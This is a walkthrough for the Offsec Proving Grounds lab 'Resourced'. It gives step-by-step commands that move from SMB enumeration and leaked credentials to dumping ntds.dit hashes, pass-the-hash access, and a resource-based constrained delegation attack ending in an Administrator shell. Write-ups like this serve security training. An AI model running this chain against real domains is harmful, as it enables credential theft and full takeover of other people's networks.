---
title: Resourced
date: 2026-03-23T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - GPO
  - bloodhound
  - web
  - enum4linux-ng
  - smb
  - RBCD
  - impacket
  - active directory

categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Resourced"
---
`nmap -p- -sV -sC -sS -A 192.168.181.175  -min-rate 5000  > nmap.txt`

![](Screenshot%202026-03-19%20at%2014.38.36.png)

`enum4linux-ng -A 192.168.181.175`

![](Screenshot%202026-03-19%20at%2014.39.26.png)

First creds:
V.Ventz:HotelCalifornia194!

![](Screenshot%202026-03-19%20at%2014.40.20.png)

RESOURCEDC                                                                                                                           
NetBIOS domain name:   resourced                                                                                                            
DNS domain: 
resourced.local                                                                                                             
FQDN: ResourceDC.resourced.local                                                                                                         
Derived domain: resource

![](Screenshot%202026-03-19%20at%2014.51.51.png)


S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420t

`smbclient -L //192.168.246.175/ -U resourced.local/V.Ventz%HotelCalifornia194!`

![](Screenshot%202026-03-20%20at%2011.02.12.png)

OR

`nxc smb 192.168.246.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --shares`

![](Screenshot%202026-03-20%20at%2011.02.59.png)

`nxc smb 192.168.246.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --users`

![](Screenshot%202026-03-20%20at%2011.01.35.png)

Bloudhound:  
`bloodhound-python -u "V.Ventz" -p 'HotelCalifornia194!' -d resourced.local -c all --zip -ns 192.168.246.175`

Start bloodhound > upload the json file and wait for it to ingest.

![](Screenshot%202026-03-20%20at%2011.05.23.png)



I hade some issues with this, because my connection was slow downloading the file, smbclient would trigger a timeout and kick me. If this happens, change the -t option to 120. It is also important to use quotation marks to when there is a space in the folder name. 

There was another file called SYSTEM that was needed to get this working 

`smbclient //192.168.246.175/"Password Audit" -U resourced.local/V.Ventz%HotelCalifornia194! -t 60`


![](Screenshot%202026-03-20%20at%2018.40.14.png)

`cd "Active Directory"`
`get ntds.dit`

The SYSTEM(hive) file contains the bootkey, the ntds.dit file has the encrypted hashes. Once you have both files in the directory you can use secrets-dump to reveal a usable hash. 

`impacket-secretsdump  -system SYSTEM LOCAL -ntds ntds.dit`

![](Screenshot%202026-03-20%20at%2018.30.08.png)

L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::

`evil-winrm -i 192.168.246.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808`

![](Screenshot%202026-03-20%20at%2018.37.31.png)

Resource-Based Constrained Delegation attack RBCD:

![](Screenshot%202026-03-24%20at%2006.32.00.png)



Note* If you have any trouble with these commands copy them to kali, then delete and redo the quotation marks. 

Add a user:  
`impacket-addcomputer -dc-ip 192.168.186.175 -computer-name 'htp$' -computer-pass 'P@ssword123' resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808`

![](Screenshot%202026-03-24%20at%2007.56.44.png)

Delegate:  
`impacket-rbcd -dc-ip 192.168.186.175 -delegate-from 'htp$' -delegate-to 'RESOURCEDC$' -action write 'resourced.local/L.Livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808`

Impersonate and request the ticket:  
`impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate Administrator 'resourced/HTP$':'P@ssword123' -dc-ip 192.168.186.175`

![](Screenshot%202026-03-24%20at%2007.58.20.png)

`mv Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache Administrator.ccache`

`export KRB5CCNAME=$PWD/Administrator.ccache`

Update the hosts file:  
`sudo vim /etc/hosts`

![](Screenshot%202026-03-24%20at%2008.42.37.png)

`impacket-psexec -dc-ip 192.168.186.175 -k -no-pass resourcedc.resourced.local`

![](Screenshot%202026-03-24%20at%2008.34.19.png)